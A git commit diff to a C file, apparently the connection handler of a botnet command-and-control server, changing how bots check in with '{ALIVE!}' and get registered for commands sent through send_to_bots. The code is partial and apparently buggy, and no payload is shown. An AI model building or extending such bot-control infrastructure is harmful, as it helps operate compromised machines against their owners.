d8ec14d0385b37aeb3ad2b595b735d0bf92713be
root <root@localhost.localdomain>
2017-12-15 19:46:30 -0500

    idk

--- bot-master/src/conn_handler.c
+++ bot-master/src/conn_handler.c
@@ -1,8 +1,9 @@
 #include "conn_handler.h"
 
 extern CONNS cons;
-extern int main_sock;
+//extern int main_sock;
 extern char STOPFLAG;
+extern short port;
 
 int make_socket(void)
 {
@@ -19,22 +20,31 @@ void *accept_handler(void)
 	struct connections *connects = &cons;
 	char temp[10];
 	struct timeval timeout={4,0};
-	setsockopt(main_sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
+	
 	while(1){
 		int addrlen = sizeof(struct sockaddr);
-		if(recvfrom(main_sock, temp, 10, 0, (struct sockaddr *)&connects->client_conn, &addrlen) != ERROR){
+		connects->sock = make_socket();
+		struct sockaddr_in serverAddr;
+		bind_socket(connects->sock, &serverAddr);
+
+		setsockopt(connects->sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
+		
+		printf("socket: %d\n", connects->sock);
+		if(recvfrom(connects->sock, temp, 10, 0, (struct sockaddr *)&connects->client_conn, &addrlen) != ERROR){
 			if(strncmp(temp, "{ALIVE!}", 8) != 0)
 				continue;
 
-			sendto(main_sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
-			connects->sock = make_socket();
+			sendto(connects->sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
+			connects->next = (struct connections *) malloc(sizeof (struct connections));
 			connects = connects->next;
 		}else{
 			if(STOPFLAG){
 				pthread_exit(0);
+			}else{
+				close(connects->sock);
 			}
-		}
 
+		}
 	}
 }
 
@@ -53,14 +63,20 @@ void send_to_bots(char *data)
 	}
 }
 
-void bind_socket(int sock, short port, struct sockaddr_in *serverAddr)
+void bind_socket(int sock, struct sockaddr_in *serverAddr)
 {
+	memset(serverAddr, 0, sizeof(struct sockaddr_in));
 	serverAddr->sin_family = AF_INET;
 	serverAddr->sin_port = htons(port);
 	serverAddr->sin_addr.s_addr = htonl(INADDR_ANY);
-	memset(serverAddr->sin_zero, '\x00', sizeof serverAddr->sin_zero);
 	if (bind(sock, (struct sockaddr *)serverAddr, sizeof(struct sockaddr)) == ERROR){
 		perror("Failed to bind the Socket");
 		exit(1);
 	}
 }
+
+/*
+server.sin_addr.s_addr = inet_addr("74.125.235.20");
+    server.sin_family = AF_INET;
+    server.sin_port = htons( 80 );
+*/
